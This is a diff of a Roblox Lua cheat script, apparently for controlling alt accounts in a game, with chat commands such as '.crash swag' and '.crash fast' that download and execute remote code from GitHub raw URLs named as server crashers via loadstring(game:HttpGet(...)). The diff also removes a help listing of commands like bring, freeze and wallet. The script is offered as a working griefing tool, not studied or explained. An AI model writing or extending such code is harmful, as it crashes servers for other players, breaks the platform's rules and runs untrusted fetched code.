@@ -77,46 +77,18 @@ local function cmds(msg,plr)
 		end
 		if msg == ".crash swag" then
 			if not isamod then
-				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("alright, leave the game!", 'All')
-				wait(5)
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher"))()
 			end
 		end
                 if msg == ".crash fast" then
                         if not isamod then
-                                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("alright, leave the game!", 'All')
-				wait(2)
-                                loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua", true))()
+                                loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua"))()
                         end
                 end
 		if msg == ".refresh" then
 			if not isamod then
 				game.Players.LocalPlayer.Character.Humanoid.Health = 0
 			end
-		end  
-		if msg == ".commands" then
-		    if isamod then
-                print("Commands")
-                print(".bring")
-                print(".altsdrop")
-                print(".altsstop")
-                print(".crash")
-                print(".woof")
-                print(".refresh")
-                print(".ad")
-                print(".unad")
-                print(".freeze")
-                print(".unfreeze")
-                print(".wallet")
-                print(".dewallet")
-                print(".setup (normal,High)")
-                print(".unsetup")
-                print(".checkcash")
-		print(".setupadmin")
-                print(".setupgrave")
-                print(".setuppool")
-                print(".setuptrain")
-		    end
 		end
 		if msg == ".setupadmin" then
 		    if not isamod then
